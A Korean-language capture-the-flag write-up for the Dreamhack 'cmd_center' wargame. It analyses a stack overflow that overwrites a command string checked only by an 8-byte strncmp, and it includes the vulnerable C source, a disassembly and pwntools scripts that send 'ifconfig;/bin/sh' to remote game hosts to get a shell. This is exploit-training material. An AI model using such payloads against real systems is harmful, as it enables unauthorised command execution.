# Exploit Tech: Command Injection

# 들어가며

## 서론

---

이번 강의에서는 cmd_center 워게임을 통한 실습을 진행한다. 버퍼 오버플로우가 어느 위치에서 일어나는지 확인하고, 검사를 어떻게 우회할 수 있는지 알아보자.

strncmp 함수는 어떤 기능을 하고, strcmp 함수와 어떤 점이 다른지 공부한 후 확인해보자.

# 분석 및 설계

## 분석

---

### 보호 기법

checksec을 사용하여 적용된 보호 기법을 파악하자.

```c
[*]
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Canary를 제외한 모든 보호 기법이 최대한으로 켜져있다.

*참고
카나리를 제외한 모든 보호 기법이 최대한으로 켜져있다고 했지만, 사실 카나리도 존재한다. main함수를 disass 해보았을 때 카나리가 존재함을 확인할 수 있지만, 프로그램에서 return이 아닌 exit()함수로 프로그램 종료를 하고 있어 카나리를 인식하지 못한다.

checksec이 카나리를 판단하는 기준은 바이너리에 __stack_chk_fail 심볼이 있는지이다. 근데 이 함수는 리턴 자체를 안 하기 때문에 컴파일러가 카나리 검증 코드를 생성하지 않은 것이다.

결과적으로 카나리가 스택에 깔려있기는 하지만 검증을 안 하기 때문에, 익스플로잇 관점에서는 카나리가 없는 것과도 마찬가지이다.

### 코드 분석

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int main()
{

    char cmd_ip[256] = "ifconfig";
    int dummy;
    char center_name[24];

    init();

    printf("Center name: ");
    read(0, center_name, 100);

    if( !strncmp(cmd_ip, "ifconfig", 8)) {
        system(cmd_ip);
    }

    else {
        printf("Something is wrong!\n");
    }
    exit(0);
}
```

cmp_ip에는 256바이트가 할당되어 있고, “ifconfig\x00” 문자열로 초기화되어 있다. center_name에는 24바이트가 할당되어 있다.

read(0, center_name, 100)으로 24바이트 공간보다 더 많은 입력을 받을 수 있는 환경이 주어져, 버퍼 오버플로우가 발생한다. 따라서 스택에 있는 다른 변수들 dummy, cmd_ip 등이나 스택 위의 주소를 덮을 가능성이 존재한다. 디스어셈블하면서 정확히 어느 범위까지 덮을 수 있는지 확인해보자.

strncmp(cmd_ip, “ifconfig”, 8)를 통해 기존 cmd_ip에 저장되어 있는 “ifconfig”이 변조되지 않았는지 확인한다. 변조되지 않았을 경우에만 system(cmd_ip)를 실행한다.

# 익스플로잇

## 익스플로잇

---

pwndbg에서 디스어셈블하여 cmd_ip와 center_name의 주소를 확인해보자.

```c
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000000008ad <+0>: push   rbp
   0x00000000000008ae <+1>: mov    rbp,rsp
   0x00000000000008b1 <+4>: sub    rsp,0x130
   0x00000000000008b8 <+11>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000008c1 <+20>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000008c5 <+24>:    xor    eax,eax
   0x00000000000008c7 <+26>:    movabs rax,0x6769666e6f636669
   0x00000000000008d1 <+36>:    mov    edx,0x0
   0x00000000000008d6 <+41>:    mov    QWORD PTR [rbp-0x110],rax
   0x00000000000008dd <+48>:    mov    QWORD PTR [rbp-0x108],rdx
   0x00000000000008e4 <+55>:    lea    rdx,[rbp-0x100]
   0x00000000000008eb <+62>:    mov    eax,0x0
   0x00000000000008f0 <+67>:    mov    ecx,0x1e
   0x00000000000008f5 <+72>:    mov    rdi,rdx
   0x00000000000008f8 <+75>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000000008fb <+78>:    mov    eax,0x0
   0x0000000000000900 <+83>:    call   0x86a <init>
   0x0000000000000905 <+88>:    lea    rdi,[rip+0xf8]        # 0xa04
   0x000000000000090c <+95>:    mov    eax,0x0
   0x0000000000000911 <+100>:   call   0x710 <printf@plt>
   0x0000000000000916 <+105>:   lea    rax,[rbp-0x130]
   0x000000000000091d <+112>:   mov    edx,0x64
   0x0000000000000922 <+117>:   mov    rsi,rax
   0x0000000000000925 <+120>:   mov    edi,0x0
   0x000000000000092a <+125>:   call   0x720 <read@plt>
   0x000000000000092f <+130>:   lea    rax,[rbp-0x110]
   0x0000000000000936 <+137>:   mov    edx,0x8
   0x000000000000093b <+142>:   lea    rsi,[rip+0xd0]        # 0xa12
   0x0000000000000942 <+149>:   mov    rdi,rax
   0x0000000000000945 <+152>:   call   0x6e0 <strncmp@plt>
   0x000000000000094a <+157>:   test   eax,eax
   0x000000000000094c <+159>:   jne    0x95f <main+178>
   0x000000000000094e <+161>:   lea    rax,[rbp-0x110]
   0x0000000000000955 <+168>:   mov    rdi,rax
   0x0000000000000958 <+171>:   call   0x700 <system@plt>
   0x000000000000095d <+176>:   jmp    0x96b <main+190>
   0x000000000000095f <+178>:   lea    rdi,[rip+0xb5]        # 0xa1b
   0x0000000000000966 <+185>:   call   0x6f0 <puts@plt>
   0x000000000000096b <+190>:   mov    edi,0x0
   0x0000000000000970 <+195>:   call   0x740 <exit@plt>
End of assembler dump.
```

cmd_ip는 [rbp-0x110], cmd_center은 [rbp-0x130]으로 확인된다. 따라서 cmd_center이 100바이트를 입력받음으로서 생기는 버퍼 오버플로우는 cmd_ip를 100 - 0x20 = 68바이트만큼 덮을 수 있다.

```c
    if( !strncmp(cmd_ip, "ifconfig", 8)) {
        system(cmd_ip);
    }
```

strncmp(cmd_ip, “ifconfig”, 8) 함수는 두 문자열을 비교하되, 정확히 8바이트만큼만을 비교한다는 것을 의미한다. 따라서 제약 조건은 cmd_ip의 첫 8바이트만 “ifconfig”와 일치하는 것이다.

원하는 명령어, 예시로 셸을 실행하기 위해서는 다음과 같은 명령어를 작성할 수 있다.

```c
ifconfig;/bin/sh
```

따라서 페이로드를 다음과 같이 작성할 수 있다.

```c
from pwn import *

# p = process("./cmd_center")
p = remote("host3.dreamhack.games", 9342)

payload = b"A" * 0x20 + b"ifconfig" + b";/bin/sh"

p.send(payload)

p.interactive()
```

strcmp 함수는 검사할 바이트 길이를 지정해주는 것이 아닌, NULL 바이트를 만날 때까지의 문자열에 대하여 검사를 진행하는 함수이다.

만약에 strcmp 함수를 여기서 검사 조건으로 사용하였다면, “ifconfig\x00???…”과 같은 형식으로 밖에 cmd_ip를 변조할 수 없다. 근데 이러면 system 함수에서 문자열로 “ifconfig”만 인식하므로 익스플로잇 할 수 없다.

## 내 코드

---

```c
from pwn import *

p = remote("host8.dreamhack.games", 17685)

payload = b'A'*24 + b'B'*8 + b'ifconfig ; /bin/sh'
p.sendlineafter("Center name: ", payload)

p.interactive()
```

근데 왜 dummy 변수는 왜 선언한거지?

드림핵 풀이에서도 고려하지 않는데 왜 선언했는지 의문